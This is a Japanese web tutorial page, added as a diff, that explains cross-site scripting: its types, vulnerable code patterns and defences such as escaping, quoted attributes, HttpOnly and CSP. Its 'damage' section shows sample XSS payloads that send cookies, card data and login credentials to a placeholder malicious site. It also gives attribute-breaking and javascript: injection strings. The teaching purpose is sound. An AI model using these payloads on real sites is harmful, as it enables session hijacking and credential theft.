@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset=utf-8"utf-8">
+<title>クロスサイトスクリプティング(XSS) - とほほのWWW入門</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<link rel="stylesheet" href="../style3.css" tppabs="http://www.tohoho-web.com/style3.css">
+</head>
+<body>
+
+<h2>クロスサイトスクリプティング(XSS)</h2>
+<a href="../www.htm" tppabs="http://www.tohoho-web.com/www.htm">トップ</a> &gt;
+<a href="security.html" tppabs="http://www.tohoho-web.com/ex/security.html">セキュリティ</a> &gt;
+クロスサイトスクリプティング(XSS)
+
+<h4>目次</h4>
+<div class=i>
+<ul>
+<li><a href="#what">クロスサイトスクリプティングとは</a></li>
+<li><a href="#problem">XSS による被害</a></li>
+<li><a href="#3-types">XSS の 3つの攻撃手法</a></li>
+<li><a href="#wrong-code">XSS を引き起こしてしまう実装例</a></li>
+<li><a href="#protect">XSS への対処法</a></li>
+</ul>
+</div>
+
+<h4 id="what">クロスサイトスクリプティングとは</h4>
+<div class=i>
+<p>クロスサイトスクリプティング (cross site scripting) とは Web アプリケーションの脆弱性のひとつで、HTML を動的に生成する際に、リクエストデータやヘッダに埋め込まれた悪意のあるデータをそのまま HTML として表示してしまい、悪意のあるスクリプトが実行されてしまうものです。悪意をもったスクリプトがサイトを横断して実行されることからクロスサイトスクリプティングと命名されています。略称は、CSS(Cascading Style Sheet) と混同されるため、CSS ではなく XSS と略されます。</p>
+<p>例えば、掲示板などで、利用者が入力した文字列をそのまま HTML として表示した場合、利用者は文字だけではなく、HTML のタグも埋め込むことが可能となります。&lt;b&gt; などの無害なものであれば構いませんが、&lt;script&gt;～&lt;/script&gt; で悪意のあるスクリプトを書き込まれると、秘密情報が盗まれたり、不正な振り込みが実施されたりなどのセキュリティ問題が発生します。</p>
+<p>厳密には、HTMLの中に悪意のあるコードを埋め込まれてしまうものを「HTMLインジェクション」と呼び、その中で、サイトをまたがった悪意のあるスクリプトが実行されてしまうものをクロスサイトスクリプティングと呼びますが、ここでは、両者をまとめて影響と対策を紹介します。</p>
+</div>
+
+<h4 id="problem">XSSやHTMLインジェクションによる被害</h4>
+<div class=i>
+<p>XSS や HTMLインジェクションによる被害には下記などがあります。</p>
+<h5>セッションハイジャック</h5>
+<p>下記などのスクリプトによって、Cookie に埋め込まれたセッション情報などの秘密情報を、悪意のあるサイトの管理者に盗まれてしまいます。</p>
+<pre class=c>
+&lt;script&gt;
+location.href = 'http://悪意のあるサイト/getCookie.cgi?cookie=' + <em>document.cookie</em>;
+&lt;/script&gt;
+</pre>
+<h5>秘密情報の漏洩</h5>
+<p>下記などのスクリプトによって、フォームに入力された秘密データを盗まれたりします。</p>
+<pre class=c>
+&lt;script&gt;
+$('#submit').on('chick', function() {
+    $.post("http://悪意のサイト/getCardData.cgi", {"card-data": $('#card-data').val()});
+});
+&lt;/script&gt;
+</pre>
+<h5>不正な書き込み</h5>
+<p>下記などのスクリプトによって、攻撃対象の掲示板などに対して不正なメッセージを投稿されてしまいます。</p>
+<pre class=c>
+&lt;script&gt;
+$.post("/cgi-bin/blog.cgi", {"message": "悪意のある書き込み"});
+&lt;/script&gt;
+</pre>
+<h5>ページの偽造やフィッシング</h5>
+<p>スクリプトによりページの内容を書き換えられてしまいます。利用者に嘘の情報を与えるほか、下記などのスクリプトにより偽りのログイン画面を表示することで、利用者の ID/パスワードやクレジットカード番号が盗まれたりします。</p>
+<pre class=c>
+&lt;script&gt;
+document.body.innerHTML = '\
+  &lt;form method="POST" action="http://悪意のあるサイト/getIdPw.cgi"&gt;\
+  &lt;div&gt;ID: &lt;input type="text" name="id"&gt;&lt;/div&gt;\
+  &lt;div&gt;PW: &lt;input type="password" name="password"&gt;&lt;/div&gt;\
+  &lt;input type="submit" value="Login"&gt;\
+  &lt;/form&gt;';
+&lt;/script&gt;
+</pre>
+</div>
+
+<h4 id="3-types">XSS の 3つの攻撃手法</h4>
+<div class=i>
+<p>XSS には主に 3つの攻撃手法があります。</p>
+<ul>
+<li>反射型XSS (Refrected XSS)
+<li>格納型XSS (Stored XSS)
+<li>DOMベースXSS (DOM-based XSS)
+</ul>
+<h5>反射型XSS (Refrected XSS)</h5>
+<p>悪意のあるサイトや悪意のあるメールに記載された URL を利用者がクリックしてしまうことで、URL に埋め込まれた悪意のあるスクリプトが脆弱性のあるサイトで実行されてしまうもの。</p>
+<pre class=c>
+http://脆弱性のあるサイト/脆弱性のあるページ?q=<em>&lt;script&gt;悪意のあるスクリプト&lt;/script&gt;</em>
+</pre>
+<h5>格納型XSS (Stored XSS)</h5>
+<p>攻撃者が、脆弱性のあるサイトの掲示板などに悪意のあるデータを書き込んで格納しておく。これを利用者が表示する際に、悪意のあるスクリプトが実行されてしまうもの。</p>
+<pre class=c>
+名前: 山田<em>&lt;script&gt;悪意のあるスクリプト&lt;/script&gt;</em>太郎
+</pre>
+<h5>DOMベースXSS (DOM Based XSS)</h5>
+<p>サーバ側ではなく、クライアント側で動的に JavaScript で HTML 生成を行う際に、悪意のあるスクリプトが埋め込まれてしまうもの。例えば、利用者が悪意のあるサイトに仕掛けられた下記の URL をクリックしたとする。</p>
+<pre class=c>
+http://脆弱性のあるサイト/脆弱性のあるページ#<em>&lt;script&gt;悪意のあるスクリプト&lt;/script&gt;</em>
+</pre>
+<p>脆弱性のあるサイトで下記の JavaScript が存在する場合、上記の悪意のある URL が書き込まれ、悪意のあるスクリプトが実行されてしまう。</p>
+<pre class=c>
+div.innerHTML = location.hash;
+</pre>
+</div>
+
+<h4 id="wrong-code">XSS を引き起こしてしまう実装例</h4>
+<div class=i>
+<p>サイトが XSS 脆弱性を含んでしまうケースには下記などがあります。</p>
+<ul>
+<li>テキストや属性値をサニタイジングしていない
+<li>属性値を引用符で囲んでいない
+<li>URLのスキームをチェックしていない
+</ul>
+<h5>テキストや属性値をサニタイジングしていない</h5>
+<p>下記の場合、$data が 「&lt;script&gt;悪意のあるスクリプト&lt;/script&gt;」の場合に悪意のあるスクリプトが実行されてしまいます。</p>
+<pre class=c>
+&lt;div&gt;<em>$data</em>&lt;/div&gt;
+  ↓
+&lt;div&gt;<em>&lt;script&gt;悪意のあるスクリプト&lt;/script&gt;</em>&lt;/div&gt;
+</pre>
+<p>下記の場合、$data が 「" onclick="悪意のあるスクリプト」の場合に悪意のあるスクリプトが実行されてしまいます。</p>
+<pre class=c>
+&lt;input type="button" value="<em>$data</em>"&gt;
+  ↓
+&lt;input type="button" value="<em>" onclick="悪意のあるスクリプト</em>"&gt;
+</pre>
+<p>JavaScript で動的に HTML を生成する際にも注意が必要です。下記の場合、「http://脆弱性のあるサイト/脆弱性のあるページ#&lt;script&gt;悪意のあるスクリプト&lt;/script&gt;」のリンクからジャンプしてきた場合、悪意のあるスクリプトが実行されてしまいます。</p>
+<pre class=c>
+div.innerHTML = <em>location.hash</em>;
+ ↓
+&lt;div&gt;<em>#&lt;script&gt;悪意のあるスクリプト&lt;/script&gt;</em>&lt;/div&gt;
+</pre>
+<h5>属性値を引用符で囲んでいない</h5>
+<p>サニタイジングのみでは対処が不十分なケースのひとつで、下記の場合、$data が 「1 onclick=悪意のあるスクリプト」の場合に悪意のあるスクリプトが実行されてしまいます。</p>
+<pre class=c>
+&lt;input type="button" value=<em>$data</em>&gt;
+  ↓
+&lt;input type="button" value=<em>1 onclick=悪意のあるスクリプト</em>&gt;
+</pre>
+<h5>URLのスキームをチェックしていない</h5>
+<p>サニタイジングのみでは対処が不十分なケースのひとつで、下記の場合、$data が 「javascript:悪意のあるスクリプト」の場合に悪意のあるスクリプトが実行されてしまいます。</p>
+<pre class=c>
+&lt;a href="<em>$data</em>"&gt;...&lt;/a&gt;
+  ↓
+&lt;a href="<em>javascript:悪意のあるスクリプト</em>"&gt;...&lt;/a&gt;
+</pre>
+</div>
+
+<h4 id="protect">XSS への対処法</h4>
+<div class=i>
+<p>XSS の対処法としては下記などがあります。</p>
+<ul>
+<li>テキストや属性値をサニタイジングする
+<li>属性値を引用符で囲む
+<li>URLのスキームをチェックする
+<li>Cookie に HttpOnly 属性をつける
+<LI>CSP (Content Security Policy) を導入する
+</ul>
+<h5>テキストや属性値をサニタイジングする</h5>
+<p>HTML を表示する際に、テキストや属性値に含まれるメタ文字(特別な意味を持つ文字)をエスケープし、サニタイジング(無害化)します。</p>
+<pre class=c>
+&amp; → &amp;amp;  <span class="cm">// &amp;lt; が &amp;amp;lt; となってしまわないよう最初に置換</span>
+&lt; → &amp;lt;
+&gt; → &amp;gt;
+" → &amp;quot;
+' → &amp;#39;
+</pre>
+<h5>属性値を引用符で囲む</h5>
+<p>属性値にデータを指定する場合、必ず引用符で囲むようにします。</p>
+<pre class=c>
+○ &lt;input type="text" value="$data"&gt;
+× &lt;input type="text" value=$data&gt;
+</pre>
+<h5>URLのスキームをチェックする</h5>
+<p>href, rel, src などの属性値にユーザデータを指定する場合は、事前にスキームが http または https であることを確認します。</p>
+<pre class=c>
+if ($data !~ /^(http|https):/) {
+  エラー
+}
+</pre>
+<h5>Cookie に HttpOnly 属性をつける</h5>
+<p>HTTP の Set-Cookie ヘッダに HttpOnly 属性を付与すると、Cookie の値は HTTP 交換のみで使用され、JavaScript から Cookie の値を読み出せなくなります。これにより、たとえサニタイジングの対策が不十分であっても、Cookie 値を不正に盗まれるリスクが低減します。</p>
+<pre class=c>
+Set-Cookie: sid=a87fb3091cbe673876e; Secure; <em>HttpOnly</em>
+</pre>
+<h5>CSP (Content Security Policy) を導入する</h5>
+<p>近年では、CSP (Content Security Policy) 対策を導入するケースが増えています。下記などの HTTP ヘッダや &lt;meta&gt; タグを埋め込むことにより、&lt;script&gt;～&lt;/script&gt; などのインラインスクリプト、onclick="～" などのイベントハンドラ、href="javascript:～" や eval() によるスクリプト実行が禁止され、&lt;script src="～"&gt; で読み込んだスクリプトの実行も、同じサイト(同一オリジン) から読み込んだものに限定されます。</p>
+<div class="tab">HTTPヘッダ</div>
+<pre class=c2>
+<em>Content-Security-Policy</em>: default-src 'self'
+</pre>
+<div class="tab">HTML</div>
+<pre class=c2>
+&lt;meta http-equiv="<em>Content-Security-Policy</em>" content="default-src 'self'"&gt;
+</pre>
+</div>
+
+<hr>
+<div>Copyright (C) 2018 杜甫々</div>
+<div>初版:2018年2月25日 最終更新:2018年2月25日</div>
+<div>http://www.tohoho-web.com/ex/xss.html</div>
+</body>
+</html>
